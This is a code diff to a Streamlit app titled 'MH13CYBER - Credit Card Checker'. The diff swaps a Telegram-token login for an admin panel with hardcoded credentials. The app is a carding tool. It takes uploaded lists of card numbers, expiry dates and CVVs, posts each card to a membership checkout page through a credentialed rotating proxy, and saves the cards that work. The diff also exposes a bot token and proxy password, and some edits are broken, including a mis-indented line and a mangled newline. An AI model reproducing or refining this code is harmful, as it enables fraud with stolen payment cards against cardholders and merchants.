@@ -2,13 +2,8 @@ import streamlit as st
 import requests
 import random
 import string
-import telepot
 import json
 import os
-
-# Initialize Telegram bot
-TOKEN = '6793670790:AAFdIHkbA_55i3VNJUa0fnhjGDQdbUwejnM'
-bot = telepot.Bot(TOKEN)
 
 # File to store user details
 user_file = 'user_details.json'
@@ -20,35 +15,96 @@ if os.path.exists(user_file):
 else:
     users = {}
 
+# Function to save user details
+def save_users():
+    with open(user_file, 'w') as file:
+        json.dump(users, file)
+
+# Admin credentials
+admin_username = "admin"
+admin_password = "password"
+
 # Streamlit UI
 st.title("MH13CYBER - Credit Card Checker")
 
-# Telegram username input for login
-telegram_username = st.text_input("Enter your Telegram Username")
+# Admin login
+if "admin_logged_in" not in st.session_state:
+    st.session_state.admin_logged_in = False
 
-if telegram_username:
-    try:
-        updates = bot.getUpdates()
-        for update in updates:
-            message = update['message']
-            if 'text' in message and message['text'] == telegram_username:
-                user_id = message['from']['id']
-                user_name = message['from']['username']
-                if user_name not in users:
-                    users[user_name] = user_id
-                    with open(user_file, 'w') as file:
-                        json.dump(users, file)
-                st.success(f"Logged in as {user_name}")
-                break
-        else:
-            st.error("Telegram username not found. Please send your username to the bot first.")
-    except Exception as e:
-        st.error(f"Error: {e}")
+# User login
+if "user_logged_in" not in st.session_state:
+    st.session_state.user_logged_in = False
 
-if telegram_username in users:
+# Admin Panel
+if not st.session_state.admin_logged_in and not st.session_state.user_logged_in:
+    with st.form("admin_login_form"):
+        st.subheader("Admin Login")
+        admin_user = st.text_input("Admin Username")
+        admin_pass = st.text_input("Admin Password", type="password")
+        admin_login = st.form_submit_button("Login")
+
+        if admin_login:
+            if admin_user == admin_username and admin_pass == admin_password:
+                st.session_state.admin_logged_in = True
+                st.success("Admin logged in successfully!")
+            else:
+                st.error("Invalid admin credentials")
+
+if st.session_state.admin_logged_in:
+    st.subheader("Admin Panel - User Management")
+
+    for username, user_data in users.items():
+        user_status = user_data.get("status", "pending")
+        col1, col2, col3 = st.columns([2, 1, 1])
+        col1.text(username)
+        col2.text(user_status)
+
+        if user_status == "pending":
+            approve_button = col3.button("Approve", key=f"approve_{username}")
+            reject_button = col3.button("Reject", key=f"reject_{username}")
+
+            if approve_button:
+                users[username]["status"] = "approved"
+                save_users()
+                st.experimental_rerun()
+
+            if reject_button:
+                users[username]["status"] = "rejected"
+                save_users()
+                st.experimental_rerun()
+
+    if st.button("Logout Admin"):
+        st.session_state.admin_logged_in = False
+        st.experimental_rerun()
+
+# User login
+if not st.session_state.admin_logged_in:
+    with st.form("user_login_form"):
+        st.subheader("User Login")
+        telegram_username = st.text_input("Enter your Username")
+        user_login = st.form_submit_button("Login")
+
+        if user_login and telegram_username:
+            if telegram_username not in users:
+                # Generate a random user ID for simplicity
+                user_id = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+                users[telegram_username] = {"id": user_id, "status": "pending"}
+                save_users()
+                st.success(f"User {telegram_username} registered and awaiting approval.")
+            else:
+                user_status = users[telegram_username].get("status", "pending")
+                if user_status == "approved":
+                    st.session_state.user_logged_in = True
+                    st.success(f"Welcome, {telegram_username}!")
+                elif user_status == "rejected":
+                    st.error(f"User {telegram_username} has been rejected.")
+                else:
+                    st.warning(f"User {telegram_username} is pending approval.")
+
+if st.session_state.user_logged_in:
     # Upload card list file
     cardlist = st.file_uploader("Upload Card List File", type="txt")
-    savelist = st.text_input("Enter path to save live cards", value=r"D:\kALI\python\project\telegram bots\cc bot\checker\livecc.txt")
+    savelist = st.text_input("Enter path to save live cards", value=r"livecc.txt")
 
     # Proxy input
     proxy_info = st.text_input("Enter Proxy Information", value="http://povmvtrs-rotate:suljy7ayq24u@p.webshare.io:80")
@@ -159,8 +215,10 @@ if telegram_username in users:
                 'Sec-Fetch-User': '?1',
             })
 
-            account_number = "X" * 12 + cc[-4:]
+                        account_number = "X" * 12 + cc[-4:]
+            password = generate_password()[1]
             email = generate_password()[0]
+
             data = [
                 ('level', '7'),
                 ('checkjavascript', '1'),
@@ -183,16 +241,19 @@ if telegram_username in users:
             ]
 
             response = r.post('https://ecstest.net/membership-checkout/', params=params, headers=headers, data=data)
-            result = find_between(response.text, ' id="pmpro_message" class="pmpro_message pmpro_error">', '</div>')
+            response_text = response.text
+            result = find_between(response_text, ' id="pmpro_message" class="pmpro_message pmpro_error">', '</div>')
 
             st.write(f'{result} : {cc}|{mes}|{ano}|{cvv}')
-            output_string = f"{cc}|{mes}|{ano}|{cvv} --->> {result}\n"
+            output_string = f"{cc}|{mes}|{ano}|{cvv} --->> {result} ]n"
             with open(savelist, "a") as file:  # add live save path
                 file.write(output_string)
 
     if cardlist is not None:
-        content = cardlist.read().decode('utf-8')
-        lines = content.splitlines()
-        for line in lines:
-            cc, mes, ano, cvv = line.strip().split("|")
+        for line in cardlist:
+            cc, mes, ano, cvv = line.strip().decode("utf-8").split("|")
             main(cc, mes, ano, cvv)
+
+if not st.session_state.admin_logged_in and not st.session_state.user_logged_in:
+    st.warning("Please log in to continue.")
+
